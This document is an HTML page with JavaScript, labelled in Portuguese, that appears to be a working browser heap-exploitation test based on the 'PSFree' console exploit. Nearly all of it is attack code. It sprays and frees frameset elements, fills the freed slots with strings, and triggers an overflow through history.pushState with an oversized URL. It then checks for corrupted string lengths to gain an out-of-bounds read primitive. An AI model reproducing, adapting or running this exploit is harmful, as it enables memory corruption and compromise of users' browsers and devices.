<!DOCTYPE html>
<html>
<head>
    <title>PSFree Logic: StringImpl Attack</title>
    <style>
        body { background-color: #111; color: #ff0; font-family: monospace; padding: 20px; }
        button { font-size: 20px; padding: 15px; width: 100%; margin-bottom: 10px; cursor: pointer; }
        #log { border: 1px solid #555; height: 400px; overflow-y: scroll; padding: 10px; color: cyan; }
    </style>
</head>
<body>

    <h1>Ataque StringImpl (Lógica Real do PSFree)</h1>
    <p>Frameset abre o buraco -> Strings ocupam -> Overflow corrompe String.</p>

    <button onclick="runAttack(0x50)">TESTE 1: Tamanho Original PSFree (80 bytes)</button>
    <button onclick="runAttack(1024)">TESTE 2: Tamanho 1KB</button>
    <button onclick="runAttack(1024*32)">TESTE 3: Tamanho 32KB</button>
    <button onclick="runAttack(1024*1024)">TESTE 4: Tamanho 1MB (Large Heap)</button>

    <div id="log">Pronto. Reinicie o console.</div>

    <script>
        const BASE_OFFSET = 709522;
        const OVERFLOW_AMT = 1024 * 64; 

        var victims_fset = [];
        var victims_str = [];

        function log(msg) {
            const el = document.getElementById('log');
            el.innerHTML += `<div>[${new Date().toLocaleTimeString()}] ${msg}</div>`;
            el.scrollTop = el.scrollHeight;
        }

        async function runAttack(targetSize) {
            log(`--- INICIANDO TESTE COM TAMANHO ${targetSize} ---`);
            
            // 1. Preparar Framesets (Para abrir o buraco no tamanho certo)
            // Precisamos calcular quantos elementos 'Length' (8 bytes) cabem no targetSize
            const elementCount = targetSize / 8;
            const rowsString = ",".repeat(elementCount - 2);
            
            const SPRAY_COUNT = 5000;

            log("1. Alocando Framesets (Criando Slots)...");
            victims_fset = [];
            for(let i=0; i<SPRAY_COUNT; i++) {
                let fset = document.createElement('frameset');
                fset.rows = rowsString;
                victims_fset.push(fset);
            }

            // 2. Criar Buracos e IMEDIATAMENTE preencher com Strings
            log("2. Liberando Framesets e Injetando Strings...");
            
            // Prepara a string de preenchimento
            // JS Strings usam 1 ou 2 bytes. Vamos tentar criar uma string que ocupe targetSize.
            // Se for Latin1 (1 byte), length = targetSize - header.
            // Header do StringImpl é aprox 24 bytes (off_size_strimpl = 0x18 no bundle.js)
            const strLen = targetSize - 24; 
            const fillStr = "S".repeat(strLen);

            victims_str = [];

            // Estratégia de substituição rápida
            for(let i=0; i<SPRAY_COUNT; i+=2) {
                // Libera o Frameset
                victims_fset[i].rows = ""; 
                victims_fset[i] = null;
                
                // Aloca uma String no lugar (esperamos que caia no mesmo slot)
                // Adicionamos um índice para identificar depois
                let s = i + "_" + fillStr.substring((i+"_").length);
                victims_str.push(s);
            }

            // Força um GC leve
            await forceGC();

            // 3. Overflow
            log("3. Disparando Overflow...");
            setTimeout(() => {
                try {
                    let buffer = "A".repeat(BASE_OFFSET);
                    buffer += "\x01".repeat(OVERFLOW_AMT);
                    
                    history.pushState({}, "pwn", "/" + buffer);

                    log("4. Verificando Strings...");
                    checkStrings(strLen);

                } catch (e) {
                    log("Erro: " + e.message);
                }
            }, 500);
        }

        function checkStrings(originalLen) {
            let success = false;
            for(let i=0; i<victims_str.length; i++) {
                let s = victims_str[i];
                
                // SINAL DE SUCESSO: O tamanho mudou?
                // Se sobrescrevemos o cabeçalho da StringImpl, o length vira lixo (gigante)
                if (s.length !== originalLen) {
                    log(`!!! SUCESSO !!! String ${i} corrompida!`, 'green');
                    log(`Len Original: ${originalLen} | Novo: ${s.length}`);
                    
                    // Tenta ler para provar o acesso OOB (Out of Bounds)
                    try {
                        let leak = s.charCodeAt(originalLen + 100);
                        log(`Leitura OOB (+100): ${leak}`);
                    } catch(e) {}
                    
                    alert("STRINGIMPL CORRUPTED! READ PRIMITIVE READY!");
                    success = true;
                    break;
                }
            }
            if(!success) log("Nenhuma string corrompida.");
        }

        async function forceGC() {
            try { new ArrayBuffer(10 * 1024 * 1024); } catch(e){}
            return new Promise(r => setTimeout(r, 200));
        }
    </script>
</body>
</html>

